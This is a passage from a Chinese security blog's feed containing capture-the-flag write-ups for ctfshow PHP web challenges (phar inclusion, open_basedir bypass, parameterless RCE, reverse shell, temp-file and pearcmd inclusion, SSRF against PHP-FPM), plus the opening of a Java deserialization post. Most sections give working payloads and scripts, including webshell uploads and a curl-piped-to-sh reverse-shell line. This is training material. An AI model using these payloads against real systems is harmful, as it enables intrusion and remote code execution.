class="string">&quot;http://bf1f07fe-9a6c-4425-994b+7886f64b2923.challenge.ctf.show/index.php&quot;</span></span><br><span class="line">data1=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;/tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="built_in">open</span>(<span class="string">&#x27;shell.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()&#125;</span><br><span class="line">data2=&#123;<span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;phar:///tmp/a.phar&#x27;</span>,<span class="string">&#x27;content&#x27;</span>:<span class="string">&#x27;123&#x27;</span>&#125;</span><br><span class="line">requests.post(url,data=data1)</span><br><span class="line">r=requests.post(url,data=data2)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>和phar文件包含差不多的意思，对于这个脚本来说。</p><p>(这里上一题的生成phar包的方式是一模一样的)</p><h2 id="web805-open-basedir绕过"><a href="#web805-open-basedir绕过" class="headerlink" title="web805(open_basedir绕过)"></a>web805(<strong>open_basedir绕过</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>这题有点简略</p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/125577789">这篇文章写的非常详细了，有好多种方法，可以去尝试尝试</a></p><p><a href="https://www.cnblogs.com/hookjoy/p/12846164.html">这篇文章也是</a></p><p><img src="../images/image-20230305161156758.png" alt="image-20230305161156758"></p><p>发现只有当前目录可读。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/ctfshowflag&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这里的话尾部可控，可以进行想要的指令进行输入输出。  </p><p>例如查看根目录的话  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/&quot;</span>));</span><br></pre></td></tr></table></figure><p>只要尾部代码换掉就行</p><h2 id="web806-无参RCE"><a href="#web806-无参RCE" class="headerlink" title="web806(无参RCE)"></a>web806(无参RCE)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/9360">文章</a></p><p><a href="https://blog.csdn.net/qq_45570082/article/details/106602261">文章2</a></p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">get_defined_vars</span>())));&amp;shell=cat /c*;</span><br></pre></td></tr></table></figure><p>这里的shell参数的名字可以随便改，因为这样写的话是加一个数组参数在最后面，然后end的时候就会选到他。</p><p>然后最后就会</p><p><code>eval(system(cat /c*))</code></p><p>然后进行命令执行了</p><h2 id="web807-反弹shell"><a href="#web807-反弹shell" class="headerlink" title="web807(反弹shell)"></a>web807(反弹shell)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$schema</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>,<span class="number">0</span>,<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$schema</span>===<span class="string">&quot;https://&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&quot;curl <span class="subst">$url</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://your-shell.com/你的公网ip冒号你的开放端口空格|sh</span><br></pre></td></tr></table></figure><p>这是其中一个反弹shell的方法。</p><p><strong>paylaod</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=https:<span class="comment">//;curl https://your-shell.com/你的公网ip冒号你的开放端口空格|sh</span></span><br></pre></td></tr></table></figure><p>这里话是可以在自己的服务器上进行命令执行了。</p><p><img src="../images/image-20230305170129849.png" alt="image-20230305170129849"></p><h2 id="web808-卡临时文件包含"><a href="#web808-卡临时文件包含" class="headerlink" title="web808(卡临时文件包含)"></a>web808(<strong>卡临时文件包含</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-20 11:01:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-03-20 22:18:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;/tmp&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点：文件包含，session文件包含getshell，利用Segfault遗留下临时文件文件进行getshell</p><p><strong>1.利用Segfault遗留下临时文件文件进行getshell：</strong></p><p>条件：php7.1.20以下</p><p>原理：就是利用php crash后，会导致上传的临时文件保留下来，然后对其进行文件包含达到RCE的情况</p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">p牛写的文章</a></p><p>给出了/tmp下的文件，所有不需要爆破出tmp文件，直接包含</p><p>其实就是让程序崩溃的同时上传文件，那么文件就会留在/tmp目录下</p><p>php代码中使用php://filter的strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">url = <span class="string">&quot;http://6c9ff9d7-497d-4912-942c-0ab8c8d54175.challenge.ctf.show/&quot;</span></span><br><span class="line">file=&#123;</span><br><span class="line"><span class="string">&#x27;file&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">requests.<span class="title function_ invoke__">post</span>(url+<span class="string">&#x27;?file=php://filter/string.strip_tags/resource=/etc/passwd&#x27;</span>,files=file)</span><br><span class="line">r=requests.<span class="title function_ invoke__">get</span>(url)</span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line">tmp=re.<span class="title function_ invoke__">findall</span>(<span class="string">&#x27;=&gt; (php.*?)\\n&#x27;</span>,r.text,re.S)[-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">print</span>(tmp)</span><br><span class="line">r=requests.<span class="title function_ invoke__">get</span>(url+<span class="string">&#x27;?file=/tmp/&#x27;</span>+tmp)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>这个payload的意思就是先整出tmp的文件名，然后在去访问没有被清理的文件下面进行RCE</p><p><img src="../images/image-20230306162325031.png" alt="image-20230306162325031"></p><h2 id="web809-pear文件包含-RCE"><a href="#web809-pear文件包含-RCE" class="headerlink" title="web809(pear文件包含/RCE)"></a>web809(<strong>pear文件包含/RCE</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-03-20 11:01:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-03-20 22:18:10</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/input|data|phar|log|filter/i&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考点：文件包含，pearcmd.php文件包含到RCE</p><p>1.安装了pear（这样才能有pearcmd.php），在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定—with-pear才会安装。<br>2.开启了register_argc_argv，Docker环境下的PHP会开启register_argc_argv这个配置</p><p>3.存在文件包含且可以包含后缀为php的文件且没有<code>open_basedir</code>的限制。</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=/usr/local/lib/php/pearcmd.php&amp;+config-create+/<span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>+/tmp/a.txt</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230306163611428.png" alt="image-20230306163611428"></p><p>先用bp发包，然后访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=/tmp/a.txt</span><br><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /*&#x27;</span>);</span><br></pre></td></tr></table></figure><p>详细解释 </p><p><a href="https://blog.csdn.net/rfrder/article/details/121042290?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165691505116782425121278%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165691505116782425121278&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-121042290-null-null.185%5Ev2%5Etag_show&amp;utm_term=pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4450">文章</a></p><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">文章1</a></p><h2 id="web810-SSRF打PHP-FPM"><a href="#web810-SSRF打PHP-FPM" class="headerlink" title="web810(SSRF打PHP-FPM)"></a>web810(<strong>SSRF打PHP-FPM</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_RETURNTRANSFER,<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_FOLLOWLOCATION,<span class="number">0</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>这是SSRF打fastcgi，之前在SSRF专题那边是打mysql和redis</p><p>工具下载地址<code>https://github.com/tarunkant/Gopherus</code><br>打fastcgi用法：<br><code>gopherus --exploit fastcgi</code></p><p>这里不知道为啥，没打通 </p><p>然后把_后面的语句进行url编码 然后传参就能拿到flag。</p><h2 id="web811-file-put-contents打PHP-FPM"><a href="#web811-file-put-contents打PHP-FPM" class="headerlink" title="web811(file_put_contents打PHP-FPM)"></a>web811(<strong>file_put_contents打PHP-FPM</strong>)</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: h1xa</span></span><br><span class="line"><span class="comment"># @Date:   2022-03-19 12:10:55</span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2022-03-19 13:27:18</span></span><br><span class="line"><span class="comment"># @email: h1xa@ctfer.com</span></span><br><span class="line"><span class="comment"># @link: https://ctfer.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/leixiao-/p/10226633.html#autoid-0-0-0">PHP-FPM的解释</a></p><p>这里读取路径file，之后写回文件中。这看似什么都没有做。</p><p>这份代码可以用来攻击PHP-FPM</p><p>如果一个客户端试图从FTP服务器上读取文件，服务器会通知客户端将文件的内容读取（或写）到一个特定的IP和端口上。而且，这里对这些IP和端口没有进行必要的限制。例如，服务器可以告诉客户端连接到自己的某一个端口。</p><p>现在如果我们使用viewFile=ftp://evil-server/file.txt那么会发生：</p><p>首先通过 file_get_contents() 函数连接到我们的FTP服务器，并下载file.txt。<br>然后再通过 file_put_contents() 函数连接到我们的FTP服务器，并将其上传回file.txt。</p><p>那此时，在它尝试使用file_put_contents()上传回去时，我们告诉它把文件发送到127.0.0.1:9001(fpm的端口，默认是9000)<br>那么，我们就在这中间造成了一次SSRF，攻击php-fpm</p><p><a href="https://blog.csdn.net/miuzzx/article/details/124038567?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167809500916800226543840%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=167809500916800226543840&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124038567-null-null.142^v73^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=ctfshow%20web811&amp;spm=1018.2226.3001.4187">羽师傅写的文章wp</a></p><p>跟着这篇文章搞 不知道为啥 还是没复现成功。。。。</p><h2 id="web812-PHP-FPM未授权"><a href="#web812-PHP-FPM未授权" class="headerlink" title="web812(PHP-FPM未授权)"></a>web812(<strong>PHP-FPM未授权</strong>)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里包括多种类型的题目  为常见的姿势  用于积累自己的方法库&lt;/p&gt;
&lt;h2 id=&quot;web801-flask算pin&quot;&gt;&lt;a href=&quot;#web801-flask算pin&quot; class=&quot;headerlink&quot; title=&quot;web801(flask算pin)&quot;&gt;&lt;/</summary>
      
    
    
    
    
    <category term="ctfshow 常用姿势 刷题记录" scheme="https://ke1nys.github.io/tags/ctfshow-%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-java 反序列化</title>
    <link href="https://ke1nys.github.io/posts/50ac4231.html"/>
    <id>https://ke1nys.github.io/posts/50ac4231.html</id>
    <published>2023-02-24T13:21:28.000Z</published>
    <updated>2023-03-06T11:34:38.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>java里的<code>implements</code>和c++里的那个继承是一个意思，就是会继承前者里的属性和函数。 这篇文章有详细讲  —-&gt;  <a href="https://juejin.cn/s/%E5%9C%A8java%E4%B8%ADimplements%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D">文章</a></p><p>这篇文章是讲java序列化与反序列化的  挺详细的  <a href="https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167724569216800225587158%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=167724569216800225587158&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-107621010-null-null.142^v73^control_1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A8%E8%AE%B2%E8%A7%A3&amp;spm=1018.2226.3001.4187">java序列化与反序列化</a></p><p>可以来看一下这个视频来学习java反序列和序列化 <a href="https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.999.0.0&amp;vd_source=23c2bbe4623ae526416ea7a1ec4679fc">视频</a></p><p>上面的那篇文章是和下面的视频配套着讲的，也有对下面的代码的介绍</p><p>以下是视频中出现的三个java代码</p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span 